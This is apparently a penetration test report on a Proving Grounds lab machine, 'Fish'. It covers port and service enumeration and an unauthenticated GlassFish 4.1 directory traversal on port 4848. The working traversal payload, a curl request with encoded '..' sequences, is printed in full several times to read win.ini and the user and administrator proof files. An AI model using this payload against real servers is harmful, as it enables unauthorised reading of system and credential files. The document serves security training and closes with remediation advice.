# PG Practice Fish - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-05-19

---

## 1. Executive Summary

A penetration test was conducted against the target host “Fish” as part of a Proving Grounds Practice engagement. The assessment identified an arbitrary file read vulnerability within the GlassFish administrative interface running on TCP port 4848.

The vulnerability allowed unauthenticated access to sensitive files on the underlying Windows operating system through a directory traversal attack. Using this vulnerability, arbitrary files including system files and proof files were accessed remotely.

The assessment demonstrated complete compromise impact through unauthorized access to sensitive data belonging to both standard users and administrative users.

---

## 2. Scope

- **Target:** 192.168.103.168
- **Environment:** PG Practice Fish
- **Testing Window:** 2026-5-19
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Vulnerability Identification
- Arbitrary File Access
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 192.168.103.168 -T4 -oA fish_tcp --open
```

Relevant Output:

```
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp open  ms-wbt-server
4848/tcp open  http    Sun GlassFish Open Source Edition 4.1
6060/tcp open  http    SynaMan Synametrics File Manager Version 5.1
8080/tcp open  http    Sun GlassFish Open Source Edition 4.1
8686/tcp open  java-rmi
54176/tcp open  http   JBoss Enterprise Application Platform
```

Interpretation:

Multiple enterprise services were exposed, including GlassFish administration interfaces and Java-based middleware applications. The GlassFish administrative console became the primary attack surface.

---

## 5. Enumeration

### SMB Enumeration

Anonymous SMB access was tested.

Command:

```
smbclient -L //192.168.103.168 -N
```

Relevant Output:

```
session setup failed: NT_STATUS_ACCESS_DENIED
```

Interpretation:

Anonymous SMB access was not permitted.

### RPC Enumeration

Anonymous RPC enumeration was tested.

Command:

```
rpcclient -U "" -N 192.168.103.168
```

Relevant Output:

```
Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED
```

Interpretation:

RPC enumeration was restricted for unauthenticated users.

### GlassFish Enumeration

The GlassFish administrative interface was identified on TCP port 4848.

Command:

```
curl http://192.168.103.168:4848
```

Relevant Output:

```
Sun GlassFish Open Source Edition 4.1
```

Interpretation:

GlassFish version 4.1 was identified and investigated for known vulnerabilities.

---

## 6. Initial Access

### GlassFish Arbitrary File Read

A directory traversal vulnerability within the GlassFish administrative interface allowed arbitrary file reads using encoded traversal sequences.

Command:

```
curl "http://192.168.103.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini"
```

Relevant Output:

```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
```

Interpretation:

The response confirmed successful arbitrary file access on the target Windows host.

---

## 7. Post-Exploitation

### User Proof Retrieval

The traversal vulnerability was used to retrieve the user proof file belonging to user `arthur`.

Command:

```
curl "http://192.168.103.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/arthur/Desktop/local.txt"
```

Relevant Output:

```
REDACTED
```

Interpretation:

The user proof file was successfully retrieved through the arbitrary file read vulnerability.

### Root Proof Retrieval

The traversal vulnerability was used to retrieve the administrator proof file.

Command:

```
curl "http://192.168.103.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/administrator/Desktop/proof.txt"
```

Relevant Output:

```
REDACTED
```

Interpretation:

Administrative proof data was successfully accessed remotely without authentication.

---

## 8. Privilege Escalation

Privilege escalation was not required during this assessment because arbitrary file read access permitted direct retrieval of administrative proof files.

---

## 9. Proof of Compromise

### User Proof

Command:

```
curl "http://192.168.103.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/arthur/Desktop/local.txt"
```

**User Flag**: *REDACTED*

### Administrative Proof

Command:

```
curl "http://192.168.103.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/administrator/Desktop/proof.txt"
```

**Root Flag**: *REDACTED*

---

## 10. Findings & Recommendations

### Finding 1 - GlassFish Arbitrary File Read Vulnerability

**Severity:** Critical

**Description:**

The GlassFish administrative interface was vulnerable to a directory traversal flaw allowing unauthenticated arbitrary file reads on the underlying Windows operating system.

**Impact:**

An attacker could access sensitive files including configuration files, credentials, and proof files without authentication.

**Recommendation:**

Upgrade or patch the affected GlassFish installation immediately and restrict administrative interfaces from untrusted networks.

---

### Finding 2 - Exposed Administrative Services

**Severity:** High

**Description:**

Multiple enterprise administration services including GlassFish, JBoss, Java RMI, and SynaMan were exposed directly to the network.

**Impact:**

Exposed management services significantly increased the attack surface and allowed attackers to identify vulnerable software versions.

**Recommendation:**

Restrict access to management interfaces using firewall rules, VPN access, or internal segmentation controls.

---

## 11. Appendix

GlassFish Arbitrary File Read Advisory -
[https://www.exploit-db.com/exploits/39441](https://www.exploit-db.com/exploits/39441)